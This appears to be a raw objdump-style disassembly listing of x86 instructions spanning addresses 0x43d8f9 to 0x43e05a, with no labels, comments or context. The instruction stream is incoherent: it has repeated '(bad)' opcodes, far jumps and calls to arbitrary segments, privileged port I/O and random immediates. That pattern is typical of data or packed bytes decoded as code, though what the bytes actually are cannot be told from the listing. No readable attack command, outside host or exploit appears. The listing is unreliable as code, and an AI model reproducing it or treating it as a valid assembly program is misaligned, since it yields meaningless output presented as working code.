  43d8f9:	data16 xor cl,ah
  43d8fc:	push   edx
  43d8fd:	sbb    BYTE PTR [esi],ch
  43d8ff:	and    eax,esp
  43d901:	xchg   ebx,eax
  43d902:	or     BYTE PTR [eax+0x27],cl
  43d905:	add    al,BYTE PTR [ecx+0x26]
  43d908:	pusha  
  43d909:	or     ebx,DWORD PTR [edx]
  43d90b:	cmp    BYTE PTR [eax-0x23ba1ee2],ch
  43d911:	push   esi
  43d912:	mov    DWORD PTR [edx+0x7edc7d46],0x6ee49f45
  43d91c:	or     BYTE PTR [esi],0xe9
  43d91f:	dec    ecx
  43d920:	bound  edi,QWORD PTR [edx]
  43d922:	adc    bh,BYTE PTR [ebp-0x1d]
  43d925:	or     al,0xe2
  43d927:	add    DWORD PTR [edx+0x576ca963],0xffffffe8
  43d92e:	fisub  DWORD PTR [eax]
  43d930:	jo     0x43d919
  43d932:	pop    ds
  43d933:	xchg   BYTE PTR [ebx-0x30],ch
  43d936:	fcom   DWORD PTR [eax]
  43d938:	ror    BYTE PTR [ecx],1
  43d93a:	jmp    0x1164:0xd6d5007a
  43d941:	mov    BYTE PTR [edx-0x1f079be9],ch
  43d947:	imul   BYTE PTR [eax]
  43d949:	pusha  
  43d94a:	pop    edx
  43d94b:	sti    
  43d94c:	or     eax,0x7c7e0fe2
  43d951:	push   cs
  43d952:	mov    ebp,0x60a1176
  43d957:	mov    bl,0x80
  43d959:	(bad)  
  43d95a:	mov    ah,0xa8
  43d95c:	pop    ecx
  43d95d:	mov    ds:0x93e0288,eax
  43d962:	in     eax,dx
  43d963:	scas   al,BYTE PTR es:[edi]
  43d964:	jnp    0x43d994
  43d966:	pop    esi
  43d967:	sahf   
  43d968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d969:	or     BYTE PTR [eax+0xf],cl
  43d96c:	mov    bh,dl
  43d96e:	cmp    al,0x75
  43d970:	mov    esi,DWORD PTR [ebx+ecx*8-0x56464930]
  43d977:	arpl   WORD PTR [edx],di
  43d979:	push   ecx
  43d97a:	pop    esp
  43d97b:	add    al,0x32
  43d97d:	imul   edi,DWORD PTR [esi-0x4ad2429f],0x4c82f441
  43d987:	xor    eax,0x80580684
  43d98c:	mov    BYTE PTR [edx-0xb],dl
  43d98f:	push   ebx
  43d990:	inc    edx
  43d991:	(bad)  
  43d992:	icebp  
  43d993:	cdq    
  43d994:	push   esp
  43d995:	in     al,dx
  43d996:	sub    dh,BYTE PTR [eax]
  43d998:	xchg   BYTE PTR [esi-0x776ea6e2],cl
  43d99e:	outs   dx,DWORD PTR ds:[esi]
  43d99f:	pop    ecx
  43d9a0:	adc    BYTE PTR [esi-0x77c09974],dl
  43d9a6:	(bad)  
  43d9a8:	adc    eax,esi
  43d9aa:	mov    edi,0x35ac8296
  43d9af:	icebp  
  43d9b0:	add    edx,0x21
  43d9b3:	dec    esi
  43d9b4:	ins    BYTE PTR es:[edi],dx
  43d9b5:	xchg   ecx,eax
  43d9b6:	xor    dl,BYTE PTR [esi]
  43d9b8:	jp     0x43da26
  43d9ba:	arpl   bp,dx
  43d9bc:	xchg   ecx,eax
  43d9bd:	or     al,0x62
  43d9bf:	mov    esp,0x4de87630
  43d9c4:	adc    eax,0x7e7e521d
  43d9c9:	je     0x43d9a0
  43d9cb:	xor    bl,BYTE PTR [edx+0x2a1ebc77]
  43d9d1:	mov    ah,0x0
  43d9d3:	les    ebp,FWORD PTR [edx]
  43d9d5:	stc    
  43d9d6:	test   esi,esi
  43d9d8:	lods   al,BYTE PTR ds:[esi]
  43d9d9:	pop    es
  43d9da:	cmp    DWORD PTR es:[esi+eiz*8+0x147dfae8],edi
  43d9e2:	pop    esi
  43d9e3:	inc    edx
  43d9e4:	pop    ss
  43d9e5:	mov    WORD PTR [ebx-0x4abe604c],ss
  43d9eb:	frstor [edi+eax*4]
  43d9ee:	push   esp
  43d9ef:	jl     0x43d9da
  43d9f1:	push   esi
  43d9f2:	jl     0x43da27
  43d9f4:	rcr    BYTE PTR [eax],cl
  43d9f6:	add    DWORD PTR ds:0xa77cc354,eax
  43d9fc:	test   DWORD PTR ds:0xd646f4ad,edx
  43da02:	in     eax,0x70
  43da04:	and    dh,BYTE PTR [ebp+0x9fb3466]
  43da0a:	call   0x5a2886c3
  43da0f:	fwait
  43da10:	inc    esi
  43da11:	mov    dl,0x46
  43da13:	sub    al,bh
  43da15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43da16:	push   esi
  43da17:	add    al,0x18
  43da19:	jne    0x43d9dd
  43da1b:	xchg   edx,eax
  43da1c:	shl    BYTE PTR [ebp+eax*4-0x18],cl
  43da20:	jb     0x43d9a2
  43da22:	fcom   QWORD PTR [edx+0x48d6ec5b]
  43da28:	aam    0x4b
  43da2a:	adc    edx,esi
  43da2c:	cmp    al,ch
  43da2e:	push   ebx
  43da2f:	fist   DWORD PTR [edi-0x29653b10]
  43da35:	push   ds
  43da36:	mov    al,ss:0x30fb9b30
  43da3c:	mov    ah,0x7d
  43da3e:	push   eax
  43da3f:	in     eax,dx
  43da40:	jo     0x43da5a
  43da42:	pop    eax
  43da43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43da44:	cmp    al,0xa0
  43da46:	inc    eax
  43da47:	push   0xaac05147
  43da4c:	scas   eax,DWORD PTR es:[edi]
  43da4d:	add    BYTE PTR [ecx-0x35],cl
  43da50:	mov    cl,0x84
  43da52:	pop    ss
  43da53:	js     0x43da33
  43da55:	outs   dx,BYTE PTR ds:[esi]
  43da56:	jl     0x43d9ea
  43da58:	cwde   
  43da59:	in     al,0x16
  43da5b:	ret    
  43da5c:	add    BYTE PTR [ecx+edx*8-0x68],ch
  43da60:	ds adc eax,0x1e1a4040
  43da66:	or     eax,0xa035a0a0
  43da6b:	je     0x43dacf
  43da6d:	mul    BYTE PTR [eax+0x7c208d00]
  43da73:	adc    al,0xf6
  43da76:	jbe    0x43da91
  43da78:	sahf   
  43da79:	sub    DWORD PTR [edx+0x1f],esi
  43da7c:	inc    dh
  43da7e:	add    BYTE PTR [ebx-0x6524b8be],dh
  43da84:	or     cl,BYTE PTR [edi]
  43da86:	mov    al,ds:0xa2a6678b
  43da8b:	jle    0x43da64
  43da8d:	inc    ecx
  43da8e:	and    dl,ch
  43da90:	dec    ebx
  43da91:	jmp    0xb014:0xcf58bca5
  43da98:	sahf   
  43da99:	xchg   esp,eax
  43da9a:	and    BYTE PTR [eax+0x45414a79],ch
  43daa0:	or     ah,BYTE PTR [esi-0x7a]
  43daa3:	xchg   edx,edx
  43daa5:	push   ds
  43daa6:	fs in  al,dx
  43daa8:	push   0x6a
  43daaa:	pop    ss
  43daab:	sbb    dh,BYTE PTR [edi+0x5c]
  43daae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43daaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dab0:	pop    edx
  43dab1:	fs int 0xd6
  43dab4:	sbb    al,0x7a
  43dab6:	add    al,0xe5
  43dab8:	daa    
  43dab9:	pop    ds
  43daba:	push   ss
  43dabb:	xchg   BYTE PTR [esi],ch
  43dabd:	shl    BYTE PTR [edx-0x6f57eda2],cl
  43dac3:	addr16 or al,0xa0
  43dac6:	xor    ebp,ebx
  43dac8:	test   DWORD PTR [eax+0x2f143c5f],ecx
  43dace:	inc    esi
  43dacf:	cdq    
  43dad0:	dec    ecx
  43dad1:	adc    BYTE PTR [esi],dl
  43dad3:	inc    ecx
  43dad4:	pop    eax
  43dad5:	cs dec esp
  43dad7:	(bad)  
  43dad8:	jl     0x43dadb
  43dada:	push   cs
  43dadb:	sbb    BYTE PTR [esi],0x98
  43dade:	adc    ch,BYTE PTR [edx+0x53]
  43dae1:	inc    ebp
  43dae2:	inc    ebp
  43dae3:	ins    DWORD PTR es:[edi],dx
  43dae4:	and    al,0x96
  43dae6:	adc    BYTE PTR [ebp+0x156e99d4],dl
  43daec:	sbb    eax,0x8463d407
  43daf1:	addr16 sub esp,0x4e
  43daf5:	mov    ah,0x3
  43daf7:	sub    al,0xf8
  43daf9:	add    BYTE PTR [eax+0x5a28260b],0xa6
  43db00:	pop    esi
  43db01:	mov    WORD PTR [edx],ss
  43db03:	pushf  
  43db04:	push   0x5692465d
  43db09:	sub    esi,DWORD PTR [esp+ecx*4+0x15ceea8]
  43db10:	dec    ebp
  43db11:	sub    ch,0x7a
  43db14:	push   ss
  43db15:	mov    esi,0xa096eb4f
  43db1a:	data16 js 0x43db4a
  43db1d:	loop   0x43db8c
  43db1f:	js     0x43db49
  43db21:	call   0xc012:0x6f8ad417
  43db28:	je     0x43db58
  43db2a:	dec    eax
  43db2b:	mov    ebp,0x4bf1a03a
  43db30:	pop    eax
  43db31:	rcr    BYTE PTR [edx+0x1b4af946],0xac
  43db38:	pop    ebx
  43db39:	ins    BYTE PTR es:[edi],dx
  43db3a:	outs   dx,BYTE PTR ds:[esi]
  43db3b:	(bad)  
  43db3c:	xchg   edx,eax
  43db3d:	xchg   ebx,eax
  43db3e:	jbe    0x43db35
  43db40:	fcmovbe st,st(4)
  43db42:	jl     0xc031e6af
  43db48:	xchg   ebp,eax
  43db49:	add    ch,BYTE PTR [ebx-0x2909ca26]
  43db4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43db50:	dec    esi
  43db51:	ins    BYTE PTR es:[edi],dx
  43db52:	loop   0x43db4f
  43db54:	sub    BYTE PTR [ebp-0x4b],ah
  43db57:	arpl   WORD PTR [esi-0x636b7d38],cx
  43db5d:	xor    eax,0x34698a02
  43db62:	iret   
  43db63:	cli    
  43db64:	xor    al,0x80
  43db66:	sub    ah,BYTE PTR [esi+ebp*2]
  43db69:	push   eax
  43db6a:	stos   BYTE PTR es:[edi],al
  43db6b:	sub    BYTE PTR [edx],bh
  43db6d:	sbb    bh,BYTE PTR [esi-0x5b72fbe0]
  43db73:	xchg   edx,eax
  43db74:	sub    bh,ah
  43db76:	aad    0xb6
  43db78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43db79:	mov    ah,0xf6
  43db7b:	inc    eax
  43db7c:	dec    eax
  43db7d:	xchg   esp,eax
  43db7e:	in     eax,0x3e
  43db80:	xor    al,0xa3
  43db82:	lock sub al,ch
  43db85:	xchg   ebx,eax
  43db86:	adc    al,0xfa
  43db88:	push   edi
  43db89:	retf   0x368c
  43db8c:	sbb    al,0x99
  43db8e:	fdiv   st,st(2)
  43db90:	mov    ch,0xb3
  43db92:	lock cli 
  43db94:	xor    al,BYTE PTR [esp+edx*1]
  43db97:	test   eax,0xf404d9e2
  43db9c:	addps  xmm0,XMMWORD PTR [ebx+0x159a3a36]
  43dba3:	stos   BYTE PTR es:[edi],al
  43dba4:	cmp    BYTE PTR [esi+0x2aba132e],0xb1
  43dbab:	sbb    eax,0xc59eea80
  43dbb0:	mov    ds:0x6c2e2824,al
  43dbb5:	inc    ecx
  43dbb6:	inc    edi
  43dbb7:	ret    
  43dbb8:	add    DWORD PTR [edx-0x27eff130],esp
  43dbbe:	out    0xa8,eax
  43dbc0:	xor    eax,0xe46d5a1d
  43dbc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dbc6:	xor    al,0xfc
  43dbc8:	push   esi
  43dbc9:	push   ds
  43dbca:	fcomp  QWORD PTR [esi+0x3d]
  43dbcd:	push   es
  43dbce:	aam    0x40
  43dbd0:	or     dl,ah
  43dbd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dbd3:	cmp    edi,DWORD PTR ds:0x9f062b4
  43dbd9:	clc    
  43dbda:	fs pop edx
  43dbdc:	pop    eax
  43dbdd:	push   0x76
  43dbdf:	push   0xffffffcd
  43dbe1:	add    dl,bl
  43dbe3:	jl     0x43dbf8
  43dbe5:	jle    0x43dbe5
  43dbe7:	add    dh,BYTE PTR [edx-0x6]
  43dbea:	and    al,0xb4
  43dbec:	push   ss
  43dbed:	cmp    eax,0xf8192881
  43dbf2:	add    DWORD PTR [ebp-0x685e4155],edx
  43dbf8:	push   esi
  43dbf9:	data16 daa 
  43dbfb:	fs push 0xda11fdcc
  43dc01:	rcl    BYTE PTR [ebp+0x60],1
  43dc04:	sbb    al,0x36
  43dc06:	fmul   DWORD PTR [edx-0x9]
  43dc09:	aam    0xdf
  43dc0b:	jle    0x43dc6c
  43dc0d:	mov    al,0x5e
  43dc0f:	add    ebx,DWORD PTR [esi]
  43dc11:	and    al,0x61
  43dc13:	fs inc ebx
  43dc15:	mov    al,ds:0xe410709a
  43dc1a:	sbb    cl,BYTE PTR [esi]
  43dc1c:	and    DWORD PTR [edx+0xe5e4571],esp
  43dc22:	sbb    BYTE PTR [edi],bh
  43dc24:	shr    BYTE PTR [edx+0x22],1
  43dc27:	ins    BYTE PTR es:[edi],dx
  43dc28:	pushf  
  43dc29:	push   esi
  43dc2a:	sub    eax,0xae1600c8
  43dc2f:	lods   al,BYTE PTR ds:[esi]
  43dc30:	stos   DWORD PTR es:[edi],eax
  43dc31:	jg     0x43dbc3
  43dc33:	sbb    DWORD PTR [eax-0x2dad0eab],ecx
  43dc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dc3a:	sub    al,0x8e
  43dc3c:	inc    edx
  43dc3d:	and    ecx,DWORD PTR [esi+eax*8+0x3d2c3f28]
  43dc44:	xchg   BYTE PTR [eax-0x32],cl
  43dc47:	mov    ah,0x3a
  43dc49:	pop    ecx
  43dc4a:	retf   
  43dc4b:	mov    ds:0xd6581ad3,al
  43dc50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dc51:	push   0x4a8427e3
  43dc56:	or     BYTE PTR [ebp+0x78],0x1b
  43dc5a:	stos   DWORD PTR es:[edi],eax
  43dc5b:	imul   eax,DWORD PTR [ecx],0x68
  43dc5e:	fwait
  43dc5f:	cmp    al,0xf4
  43dc61:	add    eax,DWORD PTR [ebx+0x2952db04]
  43dc67:	jmp    0x43dc42
  43dc69:	rol    BYTE PTR [edi],cl
  43dc6b:	test   DWORD PTR [esi+0x76],0xd5dcd0b9
  43dc72:	xor    dh,BYTE PTR [ebp+0x68]
  43dc75:	cmc    
  43dc76:	add    BYTE PTR [edi],dh
  43dc78:	shl    esp,1
  43dc7a:	inc    ebx
  43dc7b:	in     eax,dx
  43dc7c:	mov    cl,0x36
  43dc7e:	add    al,0x52
  43dc80:	mov    edi,DWORD PTR [esi+0x0]
  43dc83:	and    eax,0x9af6de0a
  43dc88:	add    al,0x3e
  43dc8a:	rol    BYTE PTR [edi-0x3f],cl
  43dc8d:	push   ss
  43dc8e:	pop    ebx
  43dc8f:	fisttp QWORD PTR [edx]
  43dc91:	das    
  43dc92:	jmp    0x8c87849a
  43dc97:	test   BYTE PTR [ebp+0x705864a],cl
  43dc9d:	aam    0xc4
  43dc9f:	cmp    al,cl
  43dca1:	inc    ebp
  43dca2:	dec    eax
  43dca3:	cmp    al,0x2d
  43dca5:	dec    edx
  43dca6:	push   ecx
  43dca7:	pop    ebp
  43dca8:	push   0x9
  43dcaa:	mov    WORD PTR [eax+0x68aadc69],?
  43dcb0:	es pushf 
  43dcb2:	cmp    cl,BYTE PTR [ebx]
  43dcb4:	xchg   esp,eax
  43dcb5:	jae    0x43dc59
  43dcb7:	lock rcl DWORD PTR [edx-0x25],1
  43dcbb:	add    al,0x33
  43dcbd:	cs pop esi
  43dcbf:	mov    dh,0xdc
  43dcc1:	add    eax,0xc542d38a
  43dcc6:	and    esp,esp
  43dcc8:	cmp    DWORD PTR [esi+eiz*2-0x4b],0xfffffff6
  43dccd:	or     DWORD PTR [eax-0x19c39846],ebp
  43dcd3:	cmp    bl,BYTE PTR [eax]
  43dcd5:	xor    al,0xc9
  43dcd7:	js     0x43dc6b
  43dcd9:	push   ebp
  43dcda:	sub    DWORD PTR [edx],eax
  43dcdc:	lahf   
  43dcdd:	dec    edx
  43dcde:	(bad)  
  43dcdf:	(bad)  
  43dce0:	ins    DWORD PTR es:[edi],dx
  43dce1:	lods   eax,DWORD PTR ds:[esi]
  43dce2:	push   0xf4006ce
  43dce7:	(bad)  
  43dce8:	cmp    BYTE PTR [esi],bh
  43dcea:	fist   WORD PTR [ebp+0x5f]
  43dced:	inc    esp
  43dcee:	imul   edx,DWORD PTR [edx-0x80],0xffffffee
  43dcf2:	jns    0x43dc74
  43dcf4:	test   BYTE PTR [esi],0xdb
  43dcf7:	and    al,0x7c
  43dcf9:	adc    al,0x80
  43dcfb:	hlt    
  43dcfc:	pusha  
  43dcfd:	inc    edi
  43dcfe:	call   edx
  43dd00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dd01:	xchg   esp,eax
  43dd02:	lock dec edx
  43dd04:	fnstenv [eax]
  43dd06:	sbb    BYTE PTR [ebp-0x1ed32fcb],0xd3
  43dd0d:	adc    al,0x22
  43dd0f:	shl    WORD PTR [ebx+0x7e06f802],cl
  43dd16:	fdivr  DWORD PTR [eax-0x7c]
  43dd19:	pop    es
  43dd1a:	adc    edi,eax
  43dd1c:	gs clc 
  43dd1e:	and    ecx,ecx
  43dd20:	cli    
  43dd21:	pop    ds
  43dd22:	add    dl,BYTE PTR [esi]
  43dd24:	fnstenv [ecx+0x1c6ec446]
  43dd2a:	pop    ebx
  43dd2b:	xchg   edx,eax
  43dd2c:	pop    edx
  43dd2d:	mov    es,ebx
  43dd2f:	aaa    
  43dd30:	test   eax,0x3257ac5f
  43dd35:	in     al,0x84
  43dd37:	pop    ds
  43dd38:	inc    esi
  43dd39:	shl    DWORD PTR [edx-0x671be1e5],0x8c
  43dd40:	and    al,0x58
  43dd42:	dec    edx
  43dd43:	in     eax,dx
  43dd44:	and    esp,DWORD PTR [edx-0x79]
  43dd47:	xor    bh,dl
  43dd49:	in     eax,dx
  43dd4a:	in     al,dx
  43dd4b:	xchg   DWORD PTR [ecx-0x215d34b0],esp
  43dd51:	repnz xchg eax,edi
  43dd54:	push   0x64ba73e9
  43dd59:	(bad)  
  43dd5a:	ficom  DWORD PTR [edx+ebx*4]
  43dd5d:	retf   0x27a0
  43dd60:	ins    BYTE PTR es:[edi],dx
  43dd61:	sbb    al,0xee
  43dd63:	or     eax,0x15bc7402
  43dd68:	dec    edx
  43dd69:	inc    ecx
  43dd6a:	mov    ds:0xb22ab89c,al
  43dd6f:	or     ebx,DWORD PTR [ebp+0x1b]
  43dd72:	js     0x43ddb9
  43dd74:	je     0x43dd26
  43dd76:	jmp    0x43dd88
  43dd78:	shl    DWORD PTR [ecx-0x4a],cl
  43dd7b:	aad    0x68
  43dd7d:	jo     0x43ddc4
  43dd7f:	pop    esi
  43dd80:	add    BYTE PTR [ebx+0x190e956c],cl
  43dd86:	std    
  43dd87:	mov    dl,0x9e
  43dd89:	inc    esp
  43dd8a:	scas   eax,DWORD PTR es:[edi]
  43dd8b:	mov    al,ds:0x524fb6d1
  43dd90:	adc    eax,0x2e872dac
  43dd95:	cmp    DWORD PTR [ebx],eax
  43dd97:	pusha  
  43dd98:	mov    cl,0xf4
  43dd9a:	adc    BYTE PTR [eax],bl
  43dd9c:	in     al,0xe
  43dd9e:	enter  0x4fd8,0x1c
  43dda2:	fidiv  DWORD PTR [edi+0xe8a2289]
  43dda8:	push   eax
  43dda9:	shr    DWORD PTR [edi-0x7e],1
  43ddac:	lods   eax,DWORD PTR ds:[esi]
  43ddad:	test   eax,0x523075a1
  43ddb2:	push   edx
  43ddb3:	push   eax
  43ddb4:	sahf   
  43ddb5:	mov    DWORD PTR [eax+0x2f],ebx
  43ddb8:	push   ss
  43ddb9:	and    ah,BYTE PTR [esp+ebp*2+0x46]
  43ddbd:	pop    edx
  43ddbe:	ficomp WORD PTR [edx+0x5c7476f1]
  43ddc4:	pop    eax
  43ddc5:	jp     0x43dd79
  43ddc7:	add    eax,0x3cadc8bd
  43ddcc:	ins    BYTE PTR es:[edi],dx
  43ddcd:	adc    eax,0x32369097
  43ddd2:	jno    0x43dd76
  43ddd4:	push   esp
  43ddd5:	jmp    0x22059320
  43ddda:	test   BYTE PTR [esi+0x1e8c14b7],ch
  43dde0:	or     al,0xba
  43dde2:	mov    eax,ds:0xf3600b8a
  43dde7:	fs nop
  43dde9:	clc    
  43ddea:	inc    eax
  43ddeb:	retf   
  43ddec:	xlat   BYTE PTR ds:[ebx]
  43dded:	xchg   edx,eax
  43ddee:	sbb    DWORD PTR ss:[edx],0x8268073a
  43ddf5:	outs   dx,BYTE PTR ds:[esi]
  43ddf6:	scas   eax,DWORD PTR es:[edi]
  43ddf7:	ins    BYTE PTR es:[edi],dx
  43ddf8:	mov    ch,0x4d
  43ddfa:	inc    esi
  43ddfb:	cdq    
  43ddfc:	popf   
  43ddfd:	adc    BYTE PTR [ecx-0x62578968],cl
  43de03:	or     bh,BYTE PTR [esi+0x53]
  43de06:	es js  0x43de5d
  43de09:	lock retf 
  43de0b:	inc    ecx
  43de0c:	adc    DWORD PTR [edx],eax
  43de0e:	jmp    0x4c65:0xd7b65db2
  43de15:	cmp    dl,dl
  43de17:	xchg   DWORD PTR [eax+0x32],esp
  43de1a:	call   0x35b2:0xb4b7e85c
  43de21:	inc    eax
  43de22:	adc    ecx,DWORD PTR ds:0x59b75d4
  43de28:	jl     0x43de3e
  43de2a:	shl    BYTE PTR [ebp+0x36],1
  43de2d:	add    DWORD PTR [edx-0x22],edi
  43de30:	mov    edi,0x983e029
  43de35:	push   0xffffffa3
  43de37:	test   DWORD PTR [eax-0x630926b2],eax
  43de3d:	divps  xmm3,XMMWORD PTR [eax-0x296b955d]
  43de44:	add    BYTE PTR [eax+0x19b8b4fd],ch
  43de4a:	and    ebx,esp
  43de4c:	push   edi
  43de4d:	push   ss
  43de4e:	pop    esp
  43de4f:	dec    ecx
  43de50:	js     0x43de20
  43de52:	and    BYTE PTR [ecx+0x1b4eb0be],ch
  43de58:	and    eax,0xc1ab301b
  43de5d:	push   ss
  43de5e:	fisub  DWORD PTR es:[edx+0x0]
  43de62:	or     bl,BYTE PTR [edx-0x29f5a9cb]
  43de68:	pop    esi
  43de69:	mov    ch,0xf6
  43de6b:	sbb    al,BYTE PTR [ebx+0x41]
  43de6e:	sub    ecx,DWORD PTR [eax+ebx*8-0x61ed4d24]
  43de75:	adc    edi,edx
  43de77:	les    esp,FWORD PTR [edx-0x6d456d98]
  43de7d:	jo     0x43de52
  43de7f:	jecxz  0x43de88
  43de81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43de82:	data16 fiadd DWORD PTR [ebx]
  43de85:	push   ss
  43de86:	ret    
  43de87:	add    al,0x21
  43de89:	push   ebp
  43de8a:	push   ebp
  43de8b:	cmp    al,0xae
  43de8d:	pop    ebp
  43de8e:	pop    eax
  43de8f:	sub    dl,ch
  43de91:	das    
  43de92:	or     ch,BYTE PTR [edx+0x5c602944]
  43de98:	inc    edx
  43de99:	sar    BYTE PTR [edi-0x77],0x15
  43de9d:	xchg   DWORD PTR [edx],eax
  43de9f:	lock push edx
  43dea1:	push   0x58
  43dea3:	cmp    DWORD PTR [edx+0x48],edi
  43dea6:	jecxz  0x43de49
  43dea8:	sbb    BYTE PTR [esi+0x3b],0x74
  43deac:	cmp    dh,cl
  43deae:	xor    BYTE PTR [esi-0x4b9bada3],0xbe
  43deb5:	mov    esi,?
  43deb7:	jbe    0x43defe
  43deb9:	or     DWORD PTR [eax],0xfffffffc
  43debc:	add    dl,ah
  43debe:	pop    ds
  43debf:	in     eax,dx
  43dec0:	push   esp
  43dec1:	jp     0x43df04
  43dec3:	imul   eax,edi,0x38eacc51
  43dec9:	jmp    0x197c:0x154c1353
  43ded0:	pop    eax
  43ded1:	sbb    BYTE PTR [esi],dh
  43ded3:	sahf   
  43ded4:	cmp    edx,0xffffffa8
  43ded7:	int    0xc4
  43ded9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43deda:	aam    0x6
  43dedc:	push   es
  43dedd:	fnstsw WORD PTR [edx-0x396e4fca]
  43dee3:	xchg   edx,eax
  43dee4:	out    dx,al
  43dee5:	mov    ebp,0x4c76a20b
  43deea:	mov    ebp,0xe0f02310
  43deef:	add    eax,0x4a62af04
  43def4:	call   0xa56aa2f9
  43def9:	mov    BYTE PTR [ecx],ch
  43defb:	js     0x43de96
  43defd:	adc    eax,0x5250024e
  43df02:	data16 push bp
  43df05:	push   ebp
  43df06:	lods   eax,DWORD PTR ds:[esi]
  43df07:	mov    ds:0xde002e64,eax
  43df0c:	cli    
  43df0d:	scas   al,BYTE PTR es:[edi]
  43df0e:	fimul  WORD PTR [eax+ebx*8-0xf]
  43df12:	sub    BYTE PTR [edx+0x9],ah
  43df15:	mov    ah,0xa6
  43df17:	out    dx,al
  43df18:	in     al,dx
  43df19:	adc    BYTE PTR [edx+0x54d81347],al
  43df1f:	out    dx,eax
  43df20:	sbb    ah,dl
  43df22:	lfs    ebx,FWORD PTR [ecx]
  43df25:	add    BYTE PTR [ebp+0x6bb81da6],dh
  43df2b:	hlt    
  43df2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43df2d:	rol    BYTE PTR cs:[ebx+eiz*4-0x5e],1
  43df32:	inc    esi
  43df33:	dec    ebx
  43df34:	adc    DWORD PTR fs:[esi-0x14],ebp
  43df38:	icebp  
  43df39:	popa   
  43df3a:	cmp    eax,0xdc399202
  43df3f:	inc    eax
  43df40:	dec    edi
  43df41:	and    DWORD PTR [eax-0x6fa36b9f],eax
  43df47:	or     DWORD PTR [ecx+ecx*4],eax
  43df4a:	rcr    BYTE PTR [esp+eiz*8+0x556c529c],1
  43df51:	retf   0x2c04
  43df54:	stos   BYTE PTR es:[edi],al
  43df55:	dec    ecx
  43df56:	jge    0x43df2a
  43df58:	fmul   DWORD PTR [esi]
  43df5a:	(bad)  
  43df5b:	jmp    0x43defd
  43df5d:	test   eax,0x817856f2
  43df62:	lahf   
  43df63:	mov    al,0x76
  43df65:	xchg   edx,eax
  43df66:	sbb    al,0xbc
  43df68:	mov    bh,BYTE PTR [ecx-0x76]
  43df6b:	sar    DWORD PTR [esi],1
  43df6d:	pop    edx
  43df6e:	mov    edi,0x8288e48c
  43df73:	inc    ebx
  43df74:	loopne 0x43dfa4
  43df76:	pop    es
  43df77:	mov    ebx,0xa2d4d016
  43df7c:	nop
  43df7d:	inc    esi
  43df7e:	test   DWORD PTR [edx+0x435aace2],0x1db86185
  43df88:	adc    al,0x52
  43df8a:	push   ds
  43df8b:	xchg   edx,eax
  43df8c:	enter  0x728e,0x0
  43df90:	jle    0x43dfa4
  43df92:	mov    esp,DWORD PTR [eax+esi*1+0x5b3ddc0e]
  43df99:	inc    ebx
  43df9a:	data16 jmp 0x43df77
  43df9d:	stos   BYTE PTR es:[edi],al
  43df9e:	(bad)  
  43df9f:	push   esp
  43dfa0:	aam    0xf6
  43dfa2:	lods   eax,DWORD PTR ds:[esi]
  43dfa3:	dec    esi
  43dfa4:	lock adc dh,BYTE PTR [esi]
  43dfa7:	pop    ss
  43dfa8:	out    dx,al
  43dfa9:	pop    eax
  43dfaa:	fldcw  WORD PTR [ebx]
  43dfac:	push   0x2
  43dfae:	sahf   
  43dfaf:	mov    bh,BYTE PTR [esi+eax*2]
  43dfb2:	xor    ah,bl
  43dfb4:	out    dx,al
  43dfb5:	adc    DWORD PTR [eax-0x7f],eax
  43dfb8:	pusha  
  43dfb9:	adc    dh,BYTE PTR [ebx-0x7d6f2116]
  43dfbf:	sub    dl,BYTE PTR [esp+eax*4]
  43dfc2:	push   ds
  43dfc3:	inc    eax
  43dfc4:	add    al,0xf3
  43dfc6:	fld    DWORD PTR [ebx]
  43dfc8:	pop    ebx
  43dfc9:	frstor [eax-0x2d6931c8]
  43dfcf:	fs xor eax,0xd0a1ad1a
  43dfd5:	mov    DWORD PTR [eax+ebx*1-0x3dc746a8],ecx
  43dfdc:	pop    edx
  43dfdd:	lock or eax,0xdecca6a3
  43dfe3:	jns    0x43df99
  43dfe5:	cmp    bh,bl
  43dfe7:	pop    edi
  43dfe8:	xor    al,0x5e
  43dfea:	sbb    esp,edx
  43dfec:	and    al,0x2e
  43dfee:	sbb    BYTE PTR [eax+0x1d8105db],ch
  43dff4:	lock pop ebx
  43dff6:	pusha  
  43dff7:	jp     0x43df89
  43dff9:	(bad)  
  43dffa:	jmp    0x43df7d
  43dffc:	aam    0x7e
  43dffe:	or     BYTE PTR [eax+0x5e],ch
  43e001:	js     0x43e04d
  43e003:	mov    eax,ds:0x2efe6416
  43e008:	or     BYTE PTR [esp+esi*1],bh
  43e00b:	fiadd  WORD PTR [ecx]
  43e00d:	inc    edi
  43e00e:	jp     0x43e030
  43e010:	add    BYTE PTR [esi],bh
  43e012:	rcr    al,0x64
  43e015:	add    eax,0x804a6e6b
  43e01a:	add    al,0xb0
  43e01c:	loop   0x43dfb8
  43e01e:	and    al,0x3
  43e020:	xchg   esp,eax
  43e021:	iret   
  43e022:	inc    edi
  43e023:	or     al,0x34
  43e025:	pop    ecx
  43e026:	js     0x43e04c
  43e028:	jnp    0x43e036
  43e02a:	je     0x43e03f
  43e02c:	inc    edi
  43e02d:	loop   0x43e062
  43e02f:	pop    edx
  43e030:	fmul   QWORD PTR [edx-0x4d03fae8]
  43e036:	push   ss
  43e037:	jb     0x43e001
  43e039:	sub    cl,BYTE PTR [edi+edx*2]
  43e03c:	and    dl,BYTE PTR [edx]
  43e03e:	inc    ebp
  43e03f:	ss mov BYTE PTR ds:[ebp-0x361d7262],0xd4
  43e048:	sub    edi,DWORD PTR [edx-0x31]
  43e04b:	add    eax,0x4da9c0dc
  43e050:	add    DWORD PTR [ecx-0x5375f884],esp
  43e056:	and    ebp,DWORD PTR [eax+0x23]
  43e059:	dec    ebx
  43e05a:	in     eax,dx
